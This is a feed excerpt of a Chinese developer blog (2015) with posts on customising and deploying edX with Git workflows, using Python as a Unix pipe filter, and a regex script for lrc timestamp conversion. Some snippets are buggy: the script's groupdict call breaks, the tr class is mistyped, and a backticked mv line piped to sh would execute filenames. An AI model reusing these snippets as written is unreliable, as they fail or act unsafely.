&lt;p&gt;重点提醒一下，保证你的开发环境和生产环境参与的&lt;code&gt;configuration&lt;/code&gt;版本一致，其中&lt;code&gt;edx-platform&lt;/code&gt;的一致是最重要的。&lt;/p&gt;
&lt;h2&gt;IDE&lt;/h2&gt;
&lt;p&gt;我是Vim党，偏好Unix工具箱，基本不用IDE。&lt;/p&gt;
&lt;p&gt;Python社区比较鼓励Editor+IPython，我在折腾edX时,用的一直是Vim+IPython的组合，用地很顺手。据我所知，edX官方团队里，用IDE的人也是不多的，如果你偏好IDE，那么wiki里已经为你准备好文档了，关于如何配置PyCharm来开发edX：&lt;a href="https://github.com/edx/edx-platform/wiki/Setting-up-PyCharm-for-edX-development"&gt;Setting-up-PyCharm-for-edX-development&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PyCharm是Python社区比较流行的IDE，说实话，给edX配置PyCharm还蛮繁琐的，我在三个平台下(Linux/Mac/Windows)都帮人配置过，需要注意的是，Windows平台下无法把代码放到本地目录开发，其中有个软链接的坑（没记错的话，是xmodule目录，Windows下没有软链接），所以跑代码的时候会报错，你需要单独处理下这个软链接的问题。解决方案可以参考这里:&lt;a href="https://github.com/edx/configuration/wiki/Vagrant-troubleshooting#dealing-with-line-endings-and-symlinks-under-windows"&gt;dealing-with-line-endings-and-symlinks-under-windows&lt;/a&gt;,实际上我觉得官方的解决方案很烦，我的解决方案是采取的是PyCharm的远程编辑功能，如此一来，代码其实在本地虚拟机里，这样就不存在这个软链接的问题了&lt;/p&gt;
&lt;h2&gt;代码管理&lt;/h2&gt;
&lt;p&gt;最恶劣的情况是，安装完毕后，就撸起袖子开始侵入式地定制开发了。连分支都不新建。  &lt;/p&gt;
&lt;p&gt;稍好一些的情况是， 知道先&lt;code&gt;git checkout -b mybranch&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么最佳实践是什么呢，在我们谈论最佳实践的之前，必须熟悉Git，而后，选一种适合你们使用场景的，包括分支管理及workflow。这和恋爱相似，适合你的才是好的。之后我会分享下我们的做法&lt;/p&gt;
&lt;p&gt;项目的技术负责人必须考虑到这样的事实，我们的开发版本基于上游代码库（官方版本）的某个release，在此基础上做自己的定制开发。而上游库一直在演进中，一边增加新特性，一边修复旧bug。越到后来，上游版本越健壮和强大，但我们不能一直等它变强再定制对不对，时机不等人，我们得着手开发自己的定制需求。同时我们又期望能够升级跟进到新的上游版本，如此一来，免费获得新特性的同时，又不丢失定制功能。这便很好地在商业中利用了开源技术，这个过程就是商业公司使用开源项目都要面临的问题。如果你不考虑升级和迁移，那么对公司，等同于损失了整个开源社区的力量。我想不出技术层面上比这更大的损失。&lt;/p&gt;
&lt;p&gt;项目的技术负责人，在项目初期对这块投入多大的重视都不为过，之后会有丰厚的回报，如果草率开始，到时候必然面临手动迁移的局面，那么项目升级很可能不是件艰难的事，而是根本不可能。而那时官方出了杀手级的功能，你跟进还是不跟呢，你只好推倒重来&lt;/p&gt;
&lt;h3&gt;定制开发&lt;/h3&gt;
&lt;p&gt;《代码大全》里说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;软件工程的本质即是管理复杂度&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在这里，我只能提一些泛泛的建议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;把代码尽量的模块化，定制的功能，可以的话，尽量整个丢到django app里&lt;/li&gt;
&lt;li&gt;尽量不要去入侵edx-platform源代码，尽可能采用非侵入式插件风格的定制&lt;/li&gt;
&lt;li&gt;诸如主题的定制，你应当使用theme，而不是去改templates&lt;/li&gt;
&lt;li&gt;诸如要课程分类，添加属性，尽量不要去动课程模型，而是自建model，采用course_id关联到原有课程。而后整个功能模块丢到django app里。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你采用了以上做法，你会发现迁移起来是并不麻烦的，至少是可能的。这也是我目前采用的做法，我们的系统截止到目前迁移了几次，前段时间又从release-2014-09-17升级到Birch，过程都还算顺利。&lt;/p&gt;
&lt;p&gt;迁移的工作无非git rebase到上游新的release上，而后解决冲突/migrate数据就好。&lt;/p&gt;
&lt;p&gt;关于数据迁移，可以参考我的另一篇文章:&lt;a href="http://wwj718.github.io/edx-data-migrate.html"&gt;edx数据迁移&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;部署到生产环境&lt;/h2&gt;
&lt;p&gt;现在假设你已经定制开发完毕，代码也都git push到远程仓库。&lt;/p&gt;
&lt;p&gt;这块要细说的话，涉及到一系列Workflow相关的问题，所以不打算在此细说，况且一时半会儿也没法说清。这些更细致的内容我可能会放在edX国内开发者会议上作为主题发言来说：）&lt;/p&gt;
&lt;p&gt;简单说来，就是用好Git，在你的开发环境和生产环境之间只需要同步代码就够了。最简单的做法是只修改了行为相关的代码，没有动系统环境和数据模型。那么只需要在开发环境下&lt;code&gt;git push&lt;/code&gt;，然后到生产环境下&lt;code&gt;git pull&lt;/code&gt;，之后&lt;code&gt;sudo /edx/bin/supervisorctl restart edxapp:&lt;/code&gt;一下，生产环境就同步生效了&lt;/p&gt;
&lt;p&gt;此外，如果想让让发布迭代过程更流畅。推荐采用&lt;a href="http://danielkummer.github.io/git-flow-cheatsheet/index.zh_CN.html"&gt;Gitflow工作流&lt;/a&gt;，这种工作流示意图如下：&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx_development.png" src="img/edx/edx_development/git-workflow.png" /&gt;&lt;/p&gt;
&lt;h2&gt;协同开发&lt;/h2&gt;
&lt;p&gt;只要是一个开发团队，就得面对这个问题，如何协同开发。&lt;/p&gt;
&lt;p&gt;其实熟悉Vagrant和Git，（团队里至少应当有一人熟练Git，不然会很麻烦），遵循一些社区的建议，基本协同开发就不成问题了。&lt;/p&gt;
&lt;p&gt;Vagrant用来保证成员之间系统环境的一致性，而Git用来管理代码。&lt;/p&gt;
&lt;p&gt;根据协作情景的不同，我们需要选择不同的Git工作流&lt;/p&gt;
&lt;p&gt;如果只是1，2个人，那么&lt;code&gt;集中式工作流&lt;/code&gt;就够用了，以中央仓库作为项目所有修改的单点实体。SVN用户应该很熟悉&lt;/p&gt;
&lt;p&gt;针对小团队而言（多数情况）。&lt;code&gt;功能分支工作流&lt;/code&gt;，可能是不错的选择，简单清晰。核心想法是所有的功能开发应该在一个专门的分支上，而不是在master分支上。 这样一来，开发者在各自的功能上开发而不会弄乱主干代码&lt;/p&gt;
&lt;p&gt;针对社区协作而言，&lt;code&gt;Forking工作流&lt;/code&gt;最合适，如果暑期国内开发者会议顺利，应该国内社区也会成型，到时候，社区便采用这种方式，在github上协作，目前edX官方采用的也是这种工作流，采用&lt;code&gt;Forking工作流&lt;/code&gt;的好处是开发者只需把定制代码push到自己的服务端仓库，而只有项目维护者才能push到正式仓库。 这样项目维护者可以接受任何开发者的提交，但无需给他正式代码库的写权限。&lt;br /&gt;
如此一来社区与各个公司之间也容易协作&lt;/p&gt;
&lt;h2&gt;Pull Request&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Pull Request&lt;/code&gt;作为补充，可在以上三种工作流中应用,github的Pull Request提供了一个用户友好的Web界面，在提交变更到项目之前可以对变更进行讨论。&lt;br /&gt;
如此一来，每次提交的都有了专门的谈论区。团队成员间的协作变得更轻松方便&lt;/p&gt;
&lt;h2&gt;测试&lt;/h2&gt;
&lt;p&gt;这一块没啥特别好说的，官方的wiki和文档都写得很清楚了，参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/configuration/wiki/edX-Developer-Stack#running-lmsstudio-tests"&gt;running-lmsstudio-tests&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/docs/en_us/internal/testing.rst"&gt;testing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;我常用的工具&lt;/h2&gt;
&lt;p&gt;前边说了 我是Vim党，偏好Unix工具箱，基本不用IDE，以下是我折腾edX常用的工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;编辑器：Vim&lt;/li&gt;
&lt;li&gt;debug&lt;ul&gt;
&lt;li&gt;IPython&lt;ul&gt;
&lt;li&gt;切换到edxapp环境下，安装IPython，之后&lt;code&gt;sudo -u www-data /edx/bin/python.edxapp ./manage.py lms --settings aws shell&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo -u www-data /edx/bin/python.edxapp ./manage.py {lms|cms} runserver 8000 --settings aws&lt;/code&gt; 使用django的django-debug-toolbar来调试，用于调试生产环境&lt;/li&gt;
&lt;li&gt;如果你熟悉django，你一定知道&lt;a href="https://github.com/django-extensions/django-extensions"&gt;django-extensions&lt;/a&gt;。安装完django-extensions，你就可以使用&lt;a href="http://django-extensions-zh.readthedocs.org/zh_CN/latest/runserver_plus.html"&gt;runserver_plus&lt;/a&gt;，runserver_plus 命令启动测试服务,并用 Werkzeug 作为调试后台，Werkzeug的强大无需赘言&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据库相关:mongodump,mysqldump，图形化工具可以使用:Robomongo,MySQLWorkbench&lt;/li&gt;
&lt;li&gt;网络相关：httpie，nethogs，iftop&lt;/li&gt;
&lt;li&gt;源码阅读：understand，Souce Insight&lt;/li&gt;
&lt;li&gt;Unix工具箱：git，tail，tmux，htop，ack，diff，grep，tar，scp,crontab...&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 19 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-19:edx-development.html</guid><category>edx</category></item><item><title>Pipeline and Python</title><link>/Pipeline-and-Python.html</link><description>&lt;blockquote&gt;
&lt;p&gt;程序应该只关注一个目标，并尽可能把它做好。让程序能够互相协同工作。应该让程序处理文本数据流，因为这是一个通用的接口  --Malcolm Douglas McIlroy(Unix管道发明者)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此前写过这篇：&lt;a href="http://wwj718.github.io/regex-demo.html"&gt;正则表达式一例&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我试着用多种语言去完成这个任务，当我试着用bash和perl去解决这个问题的时候，发现perl和命令行的的结合十分紧密，很容易将perl作为管道的一截，就像sed或是grep一样。&lt;/p&gt;
&lt;p&gt;而管道是我极喜欢的Unix特性之一。&lt;/p&gt;
&lt;p&gt;一旦习惯了管道，将程序作为过滤器，就十分容易与Unix工具箱中的其他组件协作，如此一来绝大多数的工作都省了！过滤器之间协作的力量常常十分惊人。&lt;/p&gt;
&lt;h2&gt;Pipeline&lt;/h2&gt;
&lt;p&gt;管道(Pipeline)依赖于这样的约定，每个程序一开始有两个I/O数据流可用：标准输入和标准输出，许多程序都可以写作过滤器，从标准输入顺序读入数据，并且向标准输出写数据。&lt;/p&gt;
&lt;h3&gt;语法&lt;/h3&gt;
&lt;p&gt;典型语法是使用ASCII中的垂直线&lt;code&gt;|&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;demo&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ls -l | less&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;ls用于在Unix下列出目录内容，less是一个有搜索功能的交互式的文本分页器 &lt;/p&gt;
&lt;h3&gt;从管道中获益&lt;/h3&gt;
&lt;p&gt;上边的less将程序员从为自己的软件开发分页器的负担中解放了出来：他们只需要把他们的输出用过“管道”导入到less程序中即可，可以完全不顾分页问题&lt;/p&gt;
&lt;p&gt;这样就避免了代码的臃肿，降低和全局复杂度&lt;/p&gt;
&lt;p&gt;《代码大全》中给出过一个观点:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;软件工程的本质即是管理复杂度&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;管道触进了“Do one thing, Do it well”，于是当然也有利于“Keep it Simple Stupid”&lt;/p&gt;
&lt;p&gt;而这些对于一个复杂项目的成败都是至关重要的&lt;/p&gt;
&lt;h3&gt;other demo&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;tr -c '[:alnux]' '[\n*]' | sort -iu |grep -v '^[0-9]*$'&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;以上操作把标准输入的文本生成了经过排序的单词表送到标准输出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一个命令把标准输入中非字母和数字的字符在标准输出中转化为新行。&lt;/li&gt;
&lt;li&gt;第二个命令对标准输入的行进行排序，对于重复的相邻行只保留一个，然后把排好序的数据写到标准输出。&lt;/li&gt;
&lt;li&gt;第三个命令去掉所有只包含数字的行。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Pipeline and Python&lt;/h2&gt;
&lt;p&gt;那么Python程序能否方便地作为过滤器放到管道里呢。毕竟我不想捏着鼻子写perl。&lt;/p&gt;
&lt;p&gt;github了一下，找到这个&lt;a href="https://github.com/Russell91/pythonpy"&gt;pythonpy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下边我们试着用pythonpy来完成&lt;a href="http://wwj718.github.io/regex-demo.html"&gt;正则表达式一例&lt;/a&gt;中的任务&lt;/p&gt;
&lt;h3&gt;环境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;zsh&lt;/li&gt;
&lt;li&gt;virtualenv(python3) ps:涉及到中文的问题尽量用python3&lt;/li&gt;
&lt;li&gt;pip install pythonpy&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;代码&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;filenames&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;ls /PATH/*.txt&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; file in &lt;span class="nv"&gt;$filenames&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt;
cat &lt;span class="nv"&gt;$file&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; py -x &lt;span class="s2"&gt;&amp;quot;re.sub(r&amp;#39;[\u4e00-\u9fa5].*&amp;#39;,&amp;#39;&amp;#39;,x)&amp;quot;&lt;/span&gt;&amp;gt;output_&lt;span class="nv"&gt;$file&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;怎么样，够简洁吧！&lt;/p&gt;
&lt;h3&gt;pythonpy demo&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#计算&lt;/span&gt;
py &lt;span class="s1"&gt;&amp;#39;3 * 1.5&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;#4.5&lt;/span&gt;

&lt;span class="c1"&gt;#py -x ：treat each row of stdin as x&lt;/span&gt;
py &lt;span class="s1"&gt;&amp;#39;range(3)&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; py -x &lt;span class="s1"&gt;&amp;#39;int(x)*7&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;#0\n7\n14&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;a1,b1,c1\na2,b2,c2&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; py -x &lt;span class="s1"&gt;&amp;#39;x.split(&amp;quot;,&amp;quot;)[1]&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;#b1\nb2&lt;/span&gt;
&lt;span class="c1"&gt;##Append &amp;quot;.txt&amp;quot; to each line of input&lt;/span&gt;
py &lt;span class="s1"&gt;&amp;#39;range(3)&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; py -x &lt;span class="s1"&gt;&amp;#39;x + &amp;quot;.txt&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;#0.txt\n1.txt\n2.txt&lt;/span&gt;
&lt;span class="c1"&gt;##Append &amp;quot;.txt&amp;quot; to every file in the directory,ps:还是使用ipython或是shell的for来做吧&lt;/span&gt;
ls &lt;span class="p"&gt;|&lt;/span&gt; py -x &lt;span class="s1"&gt;&amp;#39;&amp;quot;mv `%s` `%s.txt`&amp;quot; % (x,x)&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sh 

&lt;span class="c1"&gt;#py -l ：treat list of stdin as l&lt;/span&gt;
py &lt;span class="s1"&gt;&amp;#39;range(3)&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; py -l &lt;span class="s1"&gt;&amp;#39;sum(int(x) for x in l)&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;#Count words beginning with each letter 。多熟悉collections（python cookbook），集合的特性相关&lt;/span&gt;
cat /usr/share/dict/words &lt;span class="p"&gt;|&lt;/span&gt; py -x &lt;span class="s1"&gt;&amp;#39;x[0].lower()&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; py -l &lt;span class="s1"&gt;&amp;#39;collections.Counter(l).most_common(5)&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;python脚本作为过滤器&lt;/h3&gt;
&lt;p&gt;如果我们想将python脚本当做过滤器用在管道里，关键便是让它能处理输入(stdin)输出(stdout)流&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#myscript.py&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#sys.stdout.write与print的区别是，print会默认添加换行符&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用：&lt;code&gt;cat text.txt|python myscript.py&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Russell91/pythonpy"&gt;pythonpy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/管道_(Unix)"&gt;管道_Unix wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/1467587/"&gt;Unix编程艺术&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-16:Pipeline-and-Python.html</guid><category>python</category></item><item><title>正则表达式之处理一组lrc听力文件后续</title><link>/regex-demo2_more.html</link><description>&lt;p&gt;此前写过这篇：&lt;a href="http://wwj718.github.io/regex-demo2.html"&gt;正则表达式之处理一组lrc听力文件&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;室友近期在学Python，觉得上篇用的方法不够直观,理解起来有些费力,希望看到一个用正则找到文本之后进行替换的demo~ 作为中国好室友，我当然要给出demo啦&lt;/p&gt;
&lt;p&gt;需求描述为：将时间格式改为以秒为单位。eg：[01:11.36]=&amp;gt;[71.36]&lt;/p&gt;
&lt;h1&gt;待处理文本&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[00:00.12]section 2.
[00:02.68]you will part of a radio programme about the opening of a new local sports shop.
[00:09.32]first you have some time to look at questions 11 to 16.
[00:39.64]now listen carefully and answer questions 11 to 16.
[00:48.24]now we go to Jane who is going to tell us about what&amp;#39;s happening in town this weekend.
[00:52.24]right,thanks Andrew,
[00:53.92]and now on to what&amp;#39;s new,
[00:56.48]and do we really need yet another sports shop in Bradcaster?
[01:01.24]well,most of you probably know Sports World-
[01:04.44]the branch of a Danish sports goods company that opened a few years ago-
[01:09.04]it&amp;#39;s attracted a lot of custom,
[01:11.36]and so the company has now decided to open another branch in the area.
[01:16.60]it&amp;#39;s going to be in the shopping centre to the west of Bradcaster,
[01:20.44]so that will be good news for all of you who&amp;#39;ve found the original shop in the north of the town hard to get to.
[01:27.12]i was invited to a special preview
[01:29.60]and i can promise you,this is the ultimate in sports retailing.

......
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;解决方案&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;decimal&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Decimal&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;min_sec_str2sec_str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;min_sec_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;groupdict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;thetime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#return min_sec_str&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;minute:second change to second&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;min_sec_str&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sec_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;sec_str&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;format_file_time&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;outputfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;output.lrc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#命名分组&lt;/span&gt;
    &lt;span class="n"&gt;thetime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;r&amp;quot;(?P&amp;lt;thetime&amp;gt;\d{2}:.{5})&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;input_file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;input_file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;format_line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;thetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min_sec_str2sec_str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;#print format_line&lt;/span&gt;
        &lt;span class="n"&gt;outputfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;format_line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;outputfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 12 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-12:regex-demo2_more.html</guid><category>regex</category></item><item><title>edX微信公众号</title><link>/wechat_edx2.html</link><description>&lt;p&gt;前段时间在博客里提到，我把oauth2的流程走通了，已经做到可以启用edx-platform中所有的API，以此为基础，利用业余时间在做edX与微信公众平台结合的工作，我在这篇文章中有提到大概思路：&lt;a href="http://wwj718.github.io/wechat_edx.html"&gt;在微信中使用edX&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;截止到今天，核心的工作基本都已经完成了，包括架构/数据解析/前端展示&lt;/p&gt;
&lt;p&gt;在此展示下成果&lt;/p&gt;
&lt;p&gt;&lt;img alt="img/edx/wechat/all.jpg" src="img/edx/wechat/all.jpg" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 10 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-10:wechat_edx2.html</guid><category>edx</category></item><item><title>关于增量式开发</title><link>/about-incremental-development.html</link><description>&lt;p&gt;增量式开发是我最喜欢的开发方式之一。&lt;/p&gt;
&lt;h2&gt;1&lt;/h2&gt;
&lt;p&gt;在读《The Django Book》时，十分震惊,技术书籍居然可以写得这般清晰，清晰如阳光照射下，清水中的鹅软石。技术类书籍中好书是向来不缺的，对新手友好的书却也并不多见。《The Django Book》算是其一，后来我再翻这本书，想它为何能把知识说得这般清晰，发现书中讲解知识的方式是&lt;code&gt;增量式&lt;/code&gt;的：每次的讲解的内容都尽量做到只包含主题相关部分，基本不添加额外的知识干扰（打击）你，即便有些不可避免的后向引用，也会明确告诉你它的作用是啥，你目前只要把它当成黑盒就行。每一段程序都尽可能简易简短，每一节都在上一节基础上加上一点新东西，这样学起来真如读小说一般连贯有趣。如果哪里不懂，基本可以确定，不懂部分就是这节多出的知识。&lt;/p&gt;
&lt;h2&gt;2&lt;/h2&gt;
&lt;p&gt;《代码大全》里，在谈论隐喻部分时作者说道&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;增量设计 / 构造 / 测试是软件开发的最强有力工具之一&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
